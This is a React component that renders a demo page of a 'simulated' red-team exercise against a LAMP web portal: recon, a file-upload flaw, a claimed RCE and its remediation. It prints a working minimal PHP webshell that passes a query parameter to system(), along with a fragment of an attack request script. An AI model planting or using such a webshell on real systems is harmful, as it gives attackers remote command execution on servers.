
import React from 'react';

const RedTeamPipeline: React.FC = () => {
  return (
    <div className="space-y-8 animate-fade-in">
      <div className="bg-red-900 text-white p-6 rounded-lg shadow-lg">
        <h2 className="text-3xl font-bold mb-2">Simulated Ethical Hacking Speed Run</h2>
        <p className="text-red-200 font-mono">TARGET: Enterprise Web Portal // ARCHITECTURE: LAMP Stack</p>
        <p className="text-red-200 font-mono">GOAL: Identify Critical Vulnerability (RCE) // TIME: 18 Minutes</p>
      </div>

      <div className="border-l-4 border-yellow-500 bg-yellow-50 p-4 rounded shadow-sm">
        <h3 className="text-lg font-bold text-yellow-800">⚠️ DISCLAIMER: SIMULATED ENVIRONMENT</h3>
        <p className="text-yellow-700 text-sm">
          The following content illustrates a simulated security assessment for educational and demonstration purposes only.
          No actual systems were targeted. The code and vulnerabilities described are artifacts of a simulated exercise to demonstrate
          the capabilities of the Spartan R&D pipeline orchestration.
        </p>
      </div>

      <section className="bg-white p-6 rounded-lg shadow-md border border-gray-200">
        <h3 className="text-xl font-bold text-gray-800 mb-4 border-b pb-2">PHASE 1: Reconnaissance & Scanning</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="bg-gray-50 p-4 rounded">
            <h4 className="font-semibold text-gray-700">1. Passive Info Gathering</h4>
            <ul className="list-disc list-inside text-sm text-gray-600 mt-2">
              <li>WHOIS/DNS: Identified primary IP range.</li>
              <li>Tech Stack: Ubuntu/Debian, Apache 2.4.x.</li>
              <li>Subdomain found: <code>files.target-sme.com</code></li>
            </ul>
          </div>
          <div className="bg-gray-50 p-4 rounded">
            <h4 className="font-semibold text-gray-700">2. Port Scanning (Nmap)</h4>
            <ul className="list-disc list-inside text-sm text-gray-600 mt-2">
              <li>Open Ports: 80 (HTTP), 443 (HTTPS), 22 (SSH).</li>
              <li>Directory Busting: Found <code>/admin/</code> and <code>/backup/</code>.</li>
              <li>Vulnerability: Outdated CMS detected on <code>/admin/</code>.</li>
            </ul>
          </div>
        </div>
      </section>

      <section className="bg-white p-6 rounded-lg shadow-md border border-gray-200">
        <h3 className="text-xl font-bold text-gray-800 mb-4 border-b pb-2">PHASE 2: Gaining Access (The Breach)</h3>
        <div className="mb-4">
          <h4 className="font-semibold text-gray-700">Vulnerability Identified</h4>
          <p className="text-sm text-gray-600">CVE-2022-29887: Critical Unauthenticated File Upload in CMS.</p>
        </div>
        
        <div className="mb-6">
          <h4 className="font-semibold text-gray-700 mb-2">Artifact: Payload Construction (PHP Webshell)</h4>
          <pre className="bg-gray-900 text-green-400 p-4 rounded overflow-x-auto text-sm font-mono">
{`<?php
// Minimal Webshell for PoC
// Usage: shell.php?cmd=whoami
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>`}
          </pre>
        </div>

        <div>
           <h4 className="font-semibold text-gray-700 mb-2">Artifact: Orchestration Script (Python Snippet)</h4>
           <pre className="bg-gray-900 text-blue-400 p-4 rounded overflow-x-auto text-sm font-mono">
{`import requests

# ... (Configuration) ...

def fire_request(session, payload, request_id):
    try:
        headers = { "User-Agent": "RedTeam-Pipeline/1.0" }
        # The Strike: POST request to target
        response = session.post(TARGET_URL, json=payload, headers=headers)
        
        if "access_token" in response.text:
            return f"[!!!] CRITICAL HIT: {response.text[:100]}"
    except Exception as e:
        return f"Failed: {str(e)}"

# ... (Thread Pool Orchestration Logic) ...`}
          </pre>
        </div>
      </section>

      <section className="bg-white p-6 rounded-lg shadow-md border border-gray-200">
         <h3 className="text-xl font-bold text-gray-800 mb-4 border-b pb-2">PHASE 3: Post-Exploitation & Reporting</h3>
         <div className="bg-green-50 border-l-4 border-green-500 p-4">
            <h4 className="font-bold text-green-800">SUCCESS: RCE Confirmed</h4>
            <p className="text-green-700 text-sm mt-1">
              Executed <code>whoami</code> command. Server returned <code>www-data</code>.
              <br/>
              <strong>Remediation:</strong> Webshell deleted immediately. Vulnerability reported.
            </p>
         </div>
      </section>
    </div>
  );
};

export default RedTeamPipeline;
